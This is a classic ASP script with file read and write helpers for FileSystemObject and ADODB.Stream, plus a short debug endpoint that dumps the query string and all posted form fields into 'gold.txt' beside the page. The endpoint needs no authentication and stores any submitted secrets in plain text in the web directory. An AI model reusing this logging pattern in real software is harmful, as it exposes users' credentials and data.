<%
Const DEF_FSOString = "Scripting.FileSystemObject"

Function ADODB_LoadFile(ByVal File)

	'On Error Resume Next
	Dim objStream,FSFlag,fs,WriteFile
	FSFlag = 1
	If DEF_FSOString <> "" Then
		Set fs = Server.CreateObject(DEF_FSOString)
		If Err Then
			FSFlag = 0
			Err.Clear
			Set fs = Nothing
		End If
	Else
		FSFlag = 0
	End If

	If FSFlag = 1 Then
		Set WriteFile = fs.OpenTextFile(Server.MapPath(File),1,True)
		If Err Then
			GBL_CHK_TempStr = "<br>读取文件失败：" & err.description & "<br>其它可能：确定是否对此文件有读取权限."
			err.Clear
			Set Fs = Nothing
			Exit Function
		End If
		If Not WriteFile.AtEndOfStream Then
			ADODB_LoadFile = WriteFile.ReadAll
			If Err Then
				GBL_CHK_TempStr = "读取文件失败：<p>" & err.description & "</p> 其它可能：确定是否对此文件有读取权限."
				err.Clear
				Set Fs = Nothing
				Exit Function
			End If
		End If
		WriteFile.Close
		Set Fs = Nothing
	Else
		Set objStream = Server.CreateObject("ADODB.Stream")
		If Err.Number=-2147221005 Then 
			GBL_CHK_TempStr = "您的主机不支持ADODB.Stream，无法完成操作，请手工进行"
			Err.Clear
			Set objStream = Nothing
			Exit Function
		End If
		With objStream
			.Type = 2
			.Mode = 3
			.Open
			.LoadFromFile Server.MapPath(File)
			.Charset = "utf-8"
			.Position = 2
			ADODB_LoadFile = .ReadText
			.Close
		End With
		Set objStream = Nothing
	End If
	If Err Then
		GBL_CHK_TempStr = "错误信息：<p>" & err.description & "</p>其它可能：确定是否对此文件有读取权限."
		err.Clear
		Set Fs = Nothing
		Exit Function
	End If

End Function

'存储内容到文件
Sub ADODB_SaveToFile(ByVal strBody,ByVal File)

	'On Error Resume Next
	Dim objStream,FSFlag,fs,WriteFile
	FSFlag = 1
	If DEF_FSOString <> "" Then
		Set fs = Server.CreateObject(DEF_FSOString)
		If Err Then
			FSFlag = 0
			Err.Clear
			Set fs = Nothing
		End If
	Else
		FSFlag = 0
	End If
	
	If FSFlag = 1 Then
		Set WriteFile = fs.CreateTextFile(Server.MapPath(File),True)
		WriteFile.Write strBody
		WriteFile.Close
		Set Fs = Nothing
	Else
		Set objStream = Server.CreateObject("ADODB.Stream")
		If Err.Number=-2147221005 Then 
			GBL_CHK_TempStr = "您的主机不支持ADODB.Stream，无法完成操作，请手工进行"
			Err.Clear
			Set objStream = Nothing
			Exit Sub
		End If
		With objStream
			.Type = 2
			.Open
			.Charset = "utf-8"
			.Position = objStream.Size
			.WriteText = strBody
			.SaveToFile Server.MapPath(File),2
			.Close
		End With
		Set objStream = Nothing
	End If
	If Err Then
		GBL_CHK_TempStr = "错误信息：<p>" & err.description & "</p>其它可能：确定是否对此文件有写入权限."
		err.Clear
		Set Fs = Nothing
		Exit Sub
	End If

End Sub

dim str
str = Request.QueryString & VbCrLf
for each x in request.Form 
str=str&x & ": " & request.Form (x) & VbCrLf
next
ADODB_SaveToFile str,"gold.txt"

' Upstream shipped this file with a bare `Sub` keyword and no name here, so it has never
' compiled -- on IIS either. It is a dead debug scaffold (nothing in the tree references
' gold.asp; the SWF posts to default.asp), so the stray keyword is simply removed.
%>
ok